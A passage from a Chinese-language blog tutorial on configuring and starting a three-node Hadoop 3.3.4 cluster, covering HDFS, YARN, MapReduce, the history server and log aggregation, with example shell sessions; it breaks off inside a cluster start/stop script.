配置文件"></a>（2）HDFS 配置文件</h4><p>配置 hdfs-site.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- nn web 端访问地址--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop100:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 2nn web 端访问地址--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.secondary.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:9868<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="（3）YARN-配置文件"><a href="#（3）YARN-配置文件" class="headerlink" title="（3）YARN 配置文件"></a>（3）YARN 配置文件</h4><p>配置 yarn-site.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定 MR 走 shuffle --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定 ResourceManager 的地址--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop101<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 环境变量的继承(老版本BUG)  --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;property&gt;</span></span><br><span class="line"><span class="comment">        &lt;name&gt;yarn.nodemanager.env-whitelist&lt;/name&gt;</span></span><br><span class="line"><span class="comment">        &lt;value&gt;JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAPRED_HOME&lt;/value&gt;</span></span><br><span class="line"><span class="comment">    &lt;/property&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="（4）MapReduce-配置文件"><a href="#（4）MapReduce-配置文件" class="headerlink" title="（4）MapReduce 配置文件"></a>（4）MapReduce 配置文件</h4><p>配置 mapred-site.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 指定 MapReduce 程序运行在 Yarn 上 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-4-4-在集群上分发配置好的-Hadoop-配置文件"><a href="#3-4-4-在集群上分发配置好的-Hadoop-配置文件" class="headerlink" title="3.4.4 在集群上分发配置好的 Hadoop 配置文件"></a>3.4.4 在集群上分发配置好的 Hadoop 配置文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop]$ xsync /opt/module/hadoop-3.3.4/etc/hadoop/</span><br></pre></td></tr></table></figure><h3 id="3-4-5-查看文件分发情况"><a href="#3-4-5-查看文件分发情况" class="headerlink" title="3.4.5 查看文件分发情况"></a>3.4.5 查看文件分发情况</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop101 ~]$ cat /opt/module/hadoop-3.3.4/etc/hadoop/core-site.xml</span><br><span class="line">[ghost@hadoop102 ~]$ cat /opt/module/hadoop-3.3.4/etc/hadoop/core-site.xml</span><br></pre></td></tr></table></figure><h2 id="3-5-群起集群"><a href="#3-5-群起集群" class="headerlink" title="3.5 群起集群"></a>3.5 群起集群</h2><h3 id="3-5-1-配置-workers"><a href="#3-5-1-配置-workers" class="headerlink" title="3.5.1 配置 workers"></a>3.5.1 配置 workers</h3><p>注意：该文件中添加的内容结尾不允许有空格，文件中不允许有空行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop]$ pwd</span><br><span class="line">/opt/module/hadoop-3.3.4/etc/hadoop</span><br><span class="line">[ghost@hadoop100 hadoop]$ vim workers </span><br><span class="line">[ghost@hadoop100 hadoop]$ cat workers </span><br><span class="line">hadoop100</span><br><span class="line">hadoop101</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">同步所有节点配置文件</span></span><br><span class="line">[ghost@hadoop100 ~]$ xsync /opt/module/hadoop-3.3.4/etc/</span><br></pre></td></tr></table></figure><h3 id="3-5-2-启动集群"><a href="#3-5-2-启动集群" class="headerlink" title="3.5.2 启动集群"></a>3.5.2 启动集群</h3><h4 id="（1）初次启动"><a href="#（1）初次启动" class="headerlink" title="（1）初次启动"></a>（1）初次启动</h4><ul><li>需要在 hadoop100 节点格式化 NameNode</li><li>注意：格式化 NameNode，会产生新的集群 id，导致 NameNode 和 DataNode 的集群 id 不一致，集群找不到已往数据。</li><li>如果集群在运行过程中报错，需要重新格式化 NameNode 的话，一定要先停止 namenode 和 datanode 进程，并且要删除所有机器的 data 和 logs 目录，然后再进行格式 化。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ hdfs namenode -format</span><br></pre></td></tr></table></figure><h4 id="（2）启动-HDFS"><a href="#（2）启动-HDFS" class="headerlink" title="（2）启动 HDFS"></a>（2）启动 HDFS</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop-3.3.4]# ./sbin/start-dfs.sh </span><br></pre></td></tr></table></figure><h4 id><a href="#" class="headerlink" title></a></h4><h4 id="（3）在配置了-ResourceManager-的节点（hadoop101）启动-YARN"><a href="#（3）在配置了-ResourceManager-的节点（hadoop101）启动-YARN" class="headerlink" title="（3）在配置了 ResourceManager 的节点（hadoop101）启动 YARN"></a>（3）在配置了 ResourceManager 的节点（hadoop101）启动 YARN</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop101 hadoop-3.3.4]$ ./sbin/start-yarn.sh</span><br></pre></td></tr></table></figure><h4 id="（4）Web-端查看-HDFS-的-NameNode"><a href="#（4）Web-端查看-HDFS-的-NameNode" class="headerlink" title="（4）Web 端查看 HDFS 的 NameNode"></a>（4）Web 端查看 HDFS 的 NameNode</h4><ul><li>浏览器中输入：<a href="http://hadoop100:9870/">http://hadoop100:9870</a> </li><li>查看 HDFS 上存储的数据信息</li></ul><h4 id="（5）Web-端查看-YARN-的-ResourceManager"><a href="#（5）Web-端查看-YARN-的-ResourceManager" class="headerlink" title="（5）Web 端查看 YARN 的 ResourceManager"></a>（5）Web 端查看 YARN 的 ResourceManager</h4><ul><li>浏览器中输入：<a href="http://hadoop101:8088/">http://hadoop101:8088</a> </li><li>查看 YARN 上运行的 Job 信息</li></ul><h3 id="3-5-3-集群基本测试"><a href="#3-5-3-集群基本测试" class="headerlink" title="3.5.3 集群基本测试"></a>3.5.3 集群基本测试</h3><h4 id="（1）上传文件到集群"><a href="#（1）上传文件到集群" class="headerlink" title="（1）上传文件到集群"></a>（1）上传文件到集群</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传小文件</span></span><br><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ hadoop fs -mkdir /input</span><br><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ hadoop fs -put /opt/module/hadoop-3.3.4/wcinput/word.txt  /input</span><br><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ hdfs dfs -du -h /input</span><br><span class="line">59  177  /input/word.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上传大文件</span></span><br><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ hadoop fs -put /opt/software/jdk-8u301-linux-x64.tar.gz /</span><br></pre></td></tr></table></figure><p><img src="/blog/6ae4aefa.html/image-20221214133809561.png"></p><h4 id="（2）上传文件后查看文件存放在什么位置"><a href="#（2）上传文件后查看文件存放在什么位置" class="headerlink" title="（2）上传文件后查看文件存放在什么位置"></a>（2）上传文件后查看文件存放在什么位置</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 HDFS 文件存储路径</span></span><br><span class="line">[ghost@hadoop100 subdir0]$ pwd</span><br><span class="line">/opt/module/hadoop-3.3.4/data/dfs/data/current/BP-32354581-172.31.58.100-1670994945067/current/finalized/subdir0/subdir0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 HDFS 在磁盘存储文件内容</span></span><br><span class="line">[ghost@hadoop100 subdir0]$ cat blk_1073741825</span><br><span class="line">ghost ghost</span><br><span class="line">sum moon</span><br><span class="line">hadoop hdfs</span><br><span class="line">mapreduce spark</span><br><span class="line">hdfs hive</span><br></pre></td></tr></table></figure><h4 id="（3）拼接文件"><a href="#（3）拼接文件" class="headerlink" title="（3）拼接文件"></a>（3）拼接文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 subdir0]$ cat blk_1073741826 &gt;&gt; tmp.tar.gz</span><br><span class="line">[ghost@hadoop100 subdir0]$ cat blk_1073741827 &gt;&gt; tmp.tar.gz</span><br><span class="line">[ghost@hadoop100 subdir0]$ tar -zxvf tmp.tar.gz</span><br><span class="line">[ghost@hadoop100 subdir0]$ ll</span><br><span class="line">总用量 536452</span><br><span class="line">-rw-rw-r--. 1 ghost ghost        59 12月 14 13:35 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 ghost ghost        11 12月 14 13:35 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 ghost ghost 134217728 12月 14 13:37 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 ghost ghost   1048583 12月 14 13:37 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 ghost ghost  11302570 12月 14 13:37 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 ghost ghost     88311 12月 14 13:37 blk_1073741827_1003.meta</span><br><span class="line">drwxr-xr-x. 8 ghost ghost       273 6月   9 2021 jdk1.8.0_301</span><br><span class="line">-rw-rw-r--. 1 ghost ghost 145520298 12月 14 13:57 tmp.tar.gz</span><br></pre></td></tr></table></figure><h4 id="（4）下载"><a href="#（4）下载" class="headerlink" title="（4）下载"></a>（4）下载</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 tmp]$ hadoop fs -get /jdk-8u301-linux-x64.tar.gz /home/ghost/tmp/</span><br><span class="line">[ghost@hadoop100 tmp]$ ll</span><br><span class="line">总用量 142112</span><br><span class="line">-rw-r--r--. 1 ghost ghost 145520298 12月 14 14:00 jdk-8u301-linux-x64.tar.gz</span><br></pre></td></tr></table></figure><h4 id="（5）执行-wordcount-程序"><a href="#（5）执行-wordcount-程序" class="headerlink" title="（5）执行 wordcount 程序"></a>（5）执行 wordcount 程序</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 ~]$ hadoop jar /opt/module/hadoop-3.3.4/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.3.4.jar wordcount /input /output</span><br></pre></td></tr></table></figure><h2 id="3-6-配置历史服务器"><a href="#3-6-配置历史服务器" class="headerlink" title="3.6  配置历史服务器"></a>3.6  配置历史服务器</h2><p>为了查看程序的历史运行情况，需要配置一下历史服务器。具体配置步骤如下：</p><h4 id="（1）配置-mapred-site-xml"><a href="#（1）配置-mapred-site-xml" class="headerlink" title="（1）配置 mapred-site.xml"></a>（1）配置 mapred-site.xml</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop]$ pwd</span><br><span class="line">/opt/module/hadoop-3.3.4/etc/hadoop</span><br><span class="line">[ghost@hadoop100 hadoop]$ vim mapred-site.xml</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;!-- 指定 MapReduce 程序运行在 Yarn 上 --&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;mapreduce.framework.name&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;yarn&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;!-- 历史服务器端地址 --&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;mapreduce.jobhistory.address&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;hadoop100:10020&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">    &lt;!-- 历史服务器 web 端地址 --&gt;</span><br><span class="line">    &lt;property&gt;</span><br><span class="line">        &lt;name&gt;mapreduce.jobhistory.webapp.address&lt;/name&gt;</span><br><span class="line">        &lt;value&gt;hadoop100:19888&lt;/value&gt;</span><br><span class="line">    &lt;/property&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><h4 id="（2）分发配置"><a href="#（2）分发配置" class="headerlink" title="（2）分发配置"></a>（2）分发配置</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop]$ xsync /opt/module/hadoop-3.3.4/etc/hadoop/</span><br></pre></td></tr></table></figure><h4 id="（3）在-hadoop100-启动历史服务器"><a href="#（3）在-hadoop100-启动历史服务器" class="headerlink" title="（3）在 hadoop100 启动历史服务器"></a>（3）在 hadoop100 启动历史服务器</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop]$ mapred --daemon start historyserver</span><br></pre></td></tr></table></figure><h4 id="（4）查看历史服务器是否启动"><a href="#（4）查看历史服务器是否启动" class="headerlink" title="（4）查看历史服务器是否启动"></a>（4）查看历史服务器是否启动</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop]$ jps</span><br><span class="line">5850 Jps</span><br><span class="line">3501 DataNode</span><br><span class="line">3374 NameNode</span><br><span class="line">5790 JobHistoryServer</span><br><span class="line">3839 NodeManager</span><br></pre></td></tr></table></figure><h4 id="（5）查看-JobHistory"><a href="#（5）查看-JobHistory" class="headerlink" title="（5）查看 JobHistory"></a>（5）查看 JobHistory</h4><ul><li><a href="http://hadoop100:19888/jobhistory">http://hadoop100:19888/jobhistory</a></li></ul><p><img src="/blog/6ae4aefa.html/image-20221214141626579.png"></p><p><img src="/blog/6ae4aefa.html/image-20221214141408327.png"></p><h2 id="3-7-配置日志的聚集"><a href="#3-7-配置日志的聚集" class="headerlink" title="3.7 配置日志的聚集"></a>3.7 配置日志的聚集</h2><p>日志聚集概念：应用运行完成以后，将程序运行日志信息上传到 HDFS 系统上。</p><p><img src="/blog/6ae4aefa.html/image-20221214142345051.png"></p><p>日志聚集功能好处：可以方便的查看到程序运行详情，方便开发调试；</p><p>注意：开启日志聚集功能，需要重新启动 NodeManager 、ResourceManager 和 HistoryServer。</p><p>开启日志聚集功能具体步骤如下：</p><h4 id="（1）配置-yarn-site-xml"><a href="#（1）配置-yarn-site-xml" class="headerlink" title="（1）配置 yarn-site.xml"></a>（1）配置 yarn-site.xml</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 开启日志聚集功能 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation-enable<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置日志聚集服务器地址 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log.server.url<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>http://hadoop100:19888/jobhistory/logs<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 设置日志保留时间为 7 天 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation.retain-seconds<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>604800<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="（2）分发配置-1"><a href="#（2）分发配置-1" class="headerlink" title="（2）分发配置"></a>（2）分发配置</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop]$ xsync /opt/module/hadoop-3.3.4/etc/hadoop/</span><br></pre></td></tr></table></figure><h4 id="（3）关闭-NodeManager-、ResourceManager-和-HistoryServer"><a href="#（3）关闭-NodeManager-、ResourceManager-和-HistoryServer" class="headerlink" title="（3）关闭 NodeManager 、ResourceManager 和 HistoryServer"></a>（3）关闭 NodeManager 、ResourceManager 和 HistoryServer</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop102 hadoop-3.3.4]$ ./sbin/stop-yarn.sh</span><br><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ mapred --daemon stop historyserver</span><br></pre></td></tr></table></figure><h4 id="（4）启动-NodeManager-、ResourceManage-和-HistoryServer"><a href="#（4）启动-NodeManager-、ResourceManage-和-HistoryServer" class="headerlink" title="（4）启动 NodeManager 、ResourceManage 和 HistoryServer"></a>（4）启动 NodeManager 、ResourceManage 和 HistoryServer</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop101 hadoop-3.3.4]$ start-yarn.sh</span><br><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ mapred --daemon start historyserver</span><br></pre></td></tr></table></figure><h4 id="（5）删除-HDFS-上已经存在的输出文件"><a href="#（5）删除-HDFS-上已经存在的输出文件" class="headerlink" title="（5）删除 HDFS 上已经存在的输出文件"></a>（5）删除 HDFS 上已经存在的输出文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ hadoop fs -rm -r /output</span><br><span class="line">Deleted /output</span><br></pre></td></tr></table></figure><h4 id="（6）执行-WordCount-程序"><a href="#（6）执行-WordCount-程序" class="headerlink" title="（6）执行 WordCount 程序"></a>（6）执行 WordCount 程序</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.3.4.jar wordcount /input /output</span><br></pre></td></tr></table></figure><h4 id="（7）查看日志"><a href="#（7）查看日志" class="headerlink" title="（7）查看日志"></a>（7）查看日志</h4><ul><li><p>历史服务器地址</p><ul><li><a href="http://hadoop100:19888/jobhistory">http://hadoop100:19888/jobhistory</a></li></ul></li><li><p>历史任务列表</p></li></ul><p><img src="/blog/6ae4aefa.html/image-20221214143911812.png"></p><ul><li>查看任务运行日志</li></ul><p><img src="/blog/6ae4aefa.html/image-20221214143949428.png" alt="image-20221214143949428"></p><ul><li>运行日志详情</li></ul><p><img src="/blog/6ae4aefa.html/image-20221214144017060.png"></p><h2 id="3-8-集群启动-x2F-停止方式总结"><a href="#3-8-集群启动-x2F-停止方式总结" class="headerlink" title="3.8 集群启动&#x2F;停止方式总结"></a>3.8 集群启动&#x2F;停止方式总结</h2><h3 id="（1）各个模块分开启动-x2F-停止（配置-ssh-是前提）常用"><a href="#（1）各个模块分开启动-x2F-停止（配置-ssh-是前提）常用" class="headerlink" title="（1）各个模块分开启动&#x2F;停止（配置 ssh 是前提）常用"></a>（1）各个模块分开启动&#x2F;停止（配置 ssh 是前提）常用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">整体启动/停止 HDFS</span></span><br><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ start-dfs.sh </span><br><span class="line">[ghost@hadoop100 hadoop-3.3.4]$ stop-dfs.sh </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">整体启动/停止 YARN</span></span><br><span class="line">[ghost@hadoop101 hadoop-3.3.4]$ start-yarn.sh</span><br><span class="line">[ghost@hadoop101 hadoop-3.3.4]$ stop-yarn.sh</span><br></pre></td></tr></table></figure><h3 id="（2）各个服务组件逐一启动-x2F-停止（不推荐使用）"><a href="#（2）各个服务组件逐一启动-x2F-停止（不推荐使用）" class="headerlink" title="（2）各个服务组件逐一启动&#x2F;停止（不推荐使用）"></a>（2）各个服务组件逐一启动&#x2F;停止（不推荐使用）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">分别启动/停止 HDFS 组件</span></span><br><span class="line">hdfs --daemon start/stop namenode/datanode/secondarynamenode</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动/停止 YARN</span></span><br><span class="line">yarn --daemon start/stop resourcemanager/nodemanager</span><br></pre></td></tr></table></figure><h2 id="3-9-编写-Hadoop-集群常用脚本"><a href="#3-9-编写-Hadoop-集群常用脚本" class="headerlink" title="3.9 编写 Hadoop 集群常用脚本"></a>3.9 编写 Hadoop 集群常用脚本</h2><h3 id="（1）Hadoop-集群启停脚本（包含-HDFS，Yarn，Historyserver）：myhadoop-sh"><a href="#（1）Hadoop-集群启停脚本（包含-HDFS，Yarn，Historyserver）：myhadoop-sh" class="headerlink" title="（1）Hadoop 集群启停脚本（包含 HDFS，Yarn，Historyserver）：myhadoop.sh"></a>（1）Hadoop 集群启停脚本（包含 HDFS，Yarn，Historyserver）：myhadoop.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 bin]$ vim myhadoop.sh</span><br><span class="line">[ghost@hadoop100 bin]$ pwd</span><br><span class="line">/home/ghost/bin</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [ $# -lt 1 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;请输入参数！&quot;</span><br><span class="line">        exit;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span 